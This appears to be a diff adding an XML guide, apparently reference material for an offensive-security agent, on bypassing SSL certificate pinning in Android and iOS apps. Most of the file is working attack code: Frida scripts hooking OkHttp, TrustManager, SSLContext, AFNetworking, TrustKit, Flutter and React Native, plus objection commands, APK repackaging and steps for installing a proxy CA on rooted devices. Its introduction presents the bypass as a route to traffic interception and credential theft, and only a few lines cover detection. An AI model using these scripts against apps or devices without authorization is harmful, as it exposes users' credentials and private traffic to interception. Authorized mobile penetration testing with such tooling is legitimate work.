@@ -1,0 +1,290 @@
+<vulnerability_guide>
+  <title>MOBILE SSL PINNING BYPASS</title>
+
+  <critical>SSL/TLS certificate pinning is the primary defense against MITM attacks on mobile apps. Bypassing it enables traffic interception, credential theft, and API analysis. Modern apps use multiple pinning mechanisms - successful bypass requires understanding each platform's implementation details.</critical>
+
+  <scope>
+    - iOS certificate pinning bypass
+    - Android certificate pinning bypass
+    - Framework-specific bypasses (OkHttp, AFNetworking, etc.)
+    - Network Security Config manipulation
+    - Runtime hooking techniques
+    - Root/jailbreak detection bypass
+  </scope>
+
+  <methodology>
+    1. IDENTIFY PINNING MECHANISM
+       {% raw %}
+       # Analyze app for pinning implementation
+
+       # iOS - Check for common pinning libraries
+       otool -L MyApp.app/MyApp | grep -i "ssl\|security\|alamofire\|trustkit"
+
+       # Android - Search for pinning in decompiled code
+       grep -r "certificatePinner\|X509TrustManager\|checkServerTrusted" ./decompiled/
+
+       # Check network_security_config.xml (Android)
+       unzip -p app.apk res/xml/network_security_config.xml
+
+       # Common pinning indicators:
+       # - TrustKit framework
+       # - OkHttp CertificatePinner
+       # - AFNetworking SSL pinning
+       # - Custom X509TrustManager
+       {% endraw %}
+
+    2. FRIDA UNIVERSAL BYPASS
+       {% raw %}
+       # Install Frida on device
+       pip install frida-tools
+
+       # Universal SSL pinning bypass script
+       frida -U -f com.target.app -l ssl_bypass.js --no-pause
+
+       # ssl_bypass.js content:
+       Java.perform(function() {
+           // Bypass OkHttp
+           var CertificatePinner = Java.use('okhttp3.CertificatePinner');
+           CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
+               console.log('[+] OkHttp pinning bypassed for: ' + hostname);
+               return;
+           };
+
+           // Bypass TrustManager
+           var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+           var TrustManager = Java.registerClass({
+               name: 'com.bypass.TrustManager',
+               implements: [X509TrustManager],
+               methods: {
+                   checkClientTrusted: function(chain, authType) {},
+                   checkServerTrusted: function(chain, authType) {},
+                   getAcceptedIssuers: function() { return []; }
+               }
+           });
+
+           // Replace SSLContext
+           var SSLContext = Java.use('javax.net.ssl.SSLContext');
+           SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom')
+               .implementation = function(km, tm, sr) {
+                   this.init(km, [TrustManager.$new()], sr);
+                   console.log('[+] SSLContext bypassed');
+               };
+       });
+       {% endraw %}
+
+    3. OBJECTION BYPASS (ANDROID/IOS)
+       {% raw %}
+       # Install objection
+       pip install objection
+
+       # Android SSL pinning bypass
+       objection -g com.target.app explore
+       # In objection console:
+       android sslpinning disable
+
+       # iOS SSL pinning bypass
+       objection -g com.target.app explore
+       ios sslpinning disable
+
+       # With specific class targeting
+       android hooking watch class okhttp3.CertificatePinner
+       {% endraw %}
+
+    4. ANDROID-SPECIFIC TECHNIQUES
+       {% raw %}
+       # Method 1: Patch network_security_config.xml
+       # Add to res/xml/network_security_config.xml:
+       <?xml version="1.0" encoding="utf-8"?>
+       <network-security-config>
+           <base-config>
+               <trust-anchors>
+                   <certificates src="system" />
+                   <certificates src="user" />
+               </trust-anchors>
+           </base-config>
+       </network-security-config>
+
+       # Method 2: apktool patch
+       apktool d app.apk -o app_unpacked
+       # Edit network_security_config.xml
+       # Rebuild
+       apktool b app_unpacked -o app_patched.apk
+       jarsigner -keystore my.keystore app_patched.apk alias
+       zipalign -v 4 app_patched.apk app_final.apk
+
+       # Method 3: Magisk module (rooted devices)
+       # Install MagiskTrustUserCerts module
+       # System will trust user-installed certificates
+       {% endraw %}
+
+    5. IOS-SPECIFIC TECHNIQUES
+       {% raw %}
+       # Method 1: SSL Kill Switch 2 (jailbroken)
+       # Install from Cydia: com.nablac0d3.sslkillswitch2
+
+       # Method 2: Frida iOS bypass
+       frida -U -f com.target.app -l ios_ssl_bypass.js
+
+       // ios_ssl_bypass.js
+       if (ObjC.available) {
+           var resolver = new ApiResolver('objc');
+
+           // Bypass AFNetworking
+           var matches = resolver.enumerateMatches('-[AFSecurityPolicy evaluateServerTrust:forDomain:]');
+           if (matches.length > 0) {
+               Interceptor.attach(matches[0].address, {
+                   onLeave: function(retval) {
+                       retval.replace(1);
+                       console.log('[+] AFNetworking bypassed');
+                   }
+               });
+           }
+
+           // Bypass TrustKit
+           matches = resolver.enumerateMatches('-[TSKPinningValidator evaluateTrust:forHostname:]');
+           if (matches.length > 0) {
+               Interceptor.attach(matches[0].address, {
+                   onLeave: function(retval) {
+                       retval.replace(0); // TSKTrustDecisionShouldAllowConnection
+                   }
+               });
+           }
+       }
+
+       # Method 3: Patch binary
+       # Use Hopper/IDA to find pinning functions
+       # Patch to always return success
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <okhttp_bypass>
+      {% raw %}
+      # OkHttp is most common Android HTTP client
+
+      // Frida script for OkHttp3
+      Java.perform(function() {
+          var CertificatePinner = Java.use('okhttp3.CertificatePinner');
+
+          // Method 1: Override check method
+          CertificatePinner.check.overload('java.lang.String', 'java.util.List')
+              .implementation = function(hostname, peerCertificates) {
+                  console.log('[+] Bypassed pinning for: ' + hostname);
+              };
+
+          // Method 2: Return empty pinner
+          CertificatePinner.check$okhttp.implementation = function(hostname, cleanedFn) {
+              console.log('[+] check$okhttp bypassed');
+          };
+
+          // For older OkHttp versions
+          var OldPinner = Java.use('com.squareup.okhttp.CertificatePinner');
+          OldPinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;')
+              .implementation = function(hostname, chain) {
+                  console.log('[+] OkHttp2 bypassed');
+              };
+      });
+      {% endraw %}
+    </okhttp_bypass>
+
+    <flutter_bypass>
+      {% raw %}
+      # Flutter apps use Dart's HTTP client
+
+      # Method 1: Patch libflutter.so
+      # Find ssl_crypto_x509_session_verify_cert_chain
+      # Patch to return success
+
+      # Method 2: Frida for Flutter
+      // Bypass BoringSSL used by Flutter
+      var m = Process.findModuleByName("libflutter.so");
+      var verify = Module.findExportByName("libflutter.so", "ssl_crypto_x509_session_verify_cert_chain");
+
+      if (verify) {
+          Interceptor.replace(verify, new NativeCallback(function(ssl, out_alert) {
+              console.log('[+] Flutter SSL bypassed');
+              return 0; // Success
+          }, 'int', ['pointer', 'pointer']));
+      }
+
+      # reFlutter tool for automated patching
+      reflutter app.apk
+      {% endraw %}
+    </flutter_bypass>
+
+    <react_native_bypass>
+      {% raw %}
+      # React Native uses OkHttp on Android, NSURLSession on iOS
+
+      # Android: Standard OkHttp bypass applies
+
+      # iOS: Patch the JavaScript bundle or use Frida
+      // Hook fetch implementation
+      if (ObjC.available) {
+          var RCTHTTPRequestHandler = ObjC.classes.RCTHTTPRequestHandler;
+          Interceptor.attach(RCTHTTPRequestHandler['- URLSession:task:didReceiveChallenge:completionHandler:'].implementation, {
+              onEnter: function(args) {
+                  // Override challenge handling
+                  var challenge = ObjC.Object(args[4]);
+                  var completionHandler = new ObjC.Block(args[5]);
+                  // Accept any certificate
+              }
+          });
+      }
+      {% endraw %}
+    </react_native_bypass>
+
+    <burp_certificate_setup>
+      {% raw %}
+      # Install Burp CA on device
+
+      # Android (API 24+, rooted):
+      # Convert Burp cert to system format
+      openssl x509 -inform DER -in cacert.der -out cacert.pem
+      hash=$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1)
+      mv cacert.pem $hash.0
+
+      # Push to system certs (requires root)
+      adb root
+      adb remount
+      adb push $hash.0 /system/etc/security/cacerts/
+      adb shell chmod 644 /system/etc/security/cacerts/$hash.0
+
+      # iOS (jailbroken):
+      # Use Cydia to install cert
+      # Or use SSL Kill Switch 2
+
+      # Non-rooted Android via Magisk:
+      # Install MagiskTrustUserCerts module
+      {% endraw %}
+    </burp_certificate_setup>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor for Frida/Objection process attachment
+    - Check for root/jailbreak indicators
+    - Implement integrity checks on app binary
+    - Use certificate transparency logs
+    - Monitor for debugger attachment
+  </detection>
+
+  <validation>
+    - Successfully intercept HTTPS traffic in Burp
+    - Capture API requests and responses
+    - Modify requests without app errors
+    - Document bypass method used
+    - Test on multiple app versions
+  </validation>
+
+  <pro_tips>
+    - Start with objection/Frida universal scripts
+    - Flutter apps need special handling (reFlutter tool)
+    - Some apps use multiple pinning layers - bypass all
+    - Check for root/jailbreak detection before pinning bypass
+    - Network Security Config bypass often simplest on Android
+    - Use Android 7-9 for easier testing (before stricter pinning)
+    - iOS apps may use App Transport Security + pinning
+  </pro_tips>
+
+  <remember>Modern mobile apps implement multiple security layers. Successful interception requires: 1) Root/jailbreak or advanced runtime manipulation, 2) Bypassing certificate pinning, 3) Potentially bypassing additional tamper detection. Always try the simplest method first (objection/Frida scripts) before attempting manual patches.</remember>
+</vulnerability_guide>
